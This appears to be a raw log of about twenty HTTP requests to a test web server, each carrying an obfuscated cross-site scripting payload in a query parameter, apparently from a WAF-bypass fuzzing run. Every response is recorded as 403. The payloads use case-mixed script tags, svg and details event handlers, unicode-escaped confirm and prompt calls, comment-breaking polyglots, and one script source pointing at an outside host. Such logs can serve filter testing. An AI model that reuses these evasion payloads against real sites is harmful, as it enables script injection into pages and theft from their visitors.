0,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
1,"http://test2.ca89033.tmweb.ru/example?p1=<svg%0Aonload=%09((pro\u006dpt))()//&p2=p2val","/example?p1=<svg%0Aonload=%09((pro\u006dpt))()//&p2=p2val",403
2,http://test2.ca89033.tmweb.ru/example?p1=<sCriPt,/example?p1=<sCriPt,403
3,"http://test2.ca89033.tmweb.ru/example?p1=<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z&p2=p2val","/example?p1=<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z&p2=p2val",403
4,http://test2.ca89033.tmweb.ru/example?p1=<deTAiLs/open/oNtoGGle=confirm()>&p2=p2val,/example?p1=<deTAiLs/open/oNtoGGle=confirm()>&p2=p2val,403
5,http://test2.ca89033.tmweb.ru/example?p1=<scRiPt,/example?p1=<scRiPt,403
6,http://test2.ca89033.tmweb.ru/example?p1=<A,/example?p1=<A,403
7,http://test2.ca89033.tmweb.ru/example?p1=<sVg,/example?p1=<sVg,403
8,http://test2.ca89033.tmweb.ru/example?p1=<A,/example?p1=<A,403
9,"http://test2.ca89033.tmweb.ru/example?p1=<sCrIpt/""<a""/srC=data:="".<a,[8].some(confirm)>&p2=p2val","/example?p1=<sCrIpt/""<a""/srC=data:="".<a,[8].some(confirm)>&p2=p2val",403
10,"http://test2.ca89033.tmweb.ru/example?p1=<svG/x="">""/oNloaD=confirm()//&p2=p2val","/example?p1=<svG/x="">""/oNloaD=confirm()//&p2=p2val",403
11,http://test2.ca89033.tmweb.ru/example?p1=<--`<iMG/srC=`,/example?p1=<--`<iMG/srC=`,403
12,http://test2.ca89033.tmweb.ru/example?p1=<SVg,/example?p1=<SVg,403
13,http://test2.ca89033.tmweb.ru/example?p1=<!--><scRipT,/example?p1=<!--><scRipT,403
14,http://test2.ca89033.tmweb.ru/example?p1=<sCriPt/src=//14.rs?&p2=p2val,/example?p1=<sCriPt/src=//14.rs?&p2=p2val,403
15,http://test2.ca89033.tmweb.ru/example?p1=<sCRIpt,/example?p1=<sCRIpt,403
16,http://test2.ca89033.tmweb.ru/example?p1=<D3/OnMouSEenTer=[2].find(confirm)>z&p2=p2val,/example?p1=<D3/OnMouSEenTer=[2].find(confirm)>z&p2=p2val,403
17,"http://test2.ca89033.tmweb.ru/example?p1=<D3""<""/OncLick=""1>[confirm``]""<"">z&p2=p2val","/example?p1=<D3""<""/OncLick=""1>[confirm``]""<"">z&p2=p2val",403
18,http://test2.ca89033.tmweb.ru/example?p1=<D3/OnpOinTeReENter=confirm``>click,/example?p1=<D3/OnpOinTeReENter=confirm``>click,403
19,"http://test2.ca89033.tmweb.ru/example?p1=<!'/*""/*/'/*/""/*--></Script><Image","/example?p1=<!'/*""/*/'/*/""/*--></Script><Image",403
20,http://test2.ca89033.tmweb.ru/example?p1=<Z,/example?p1=<Z,403
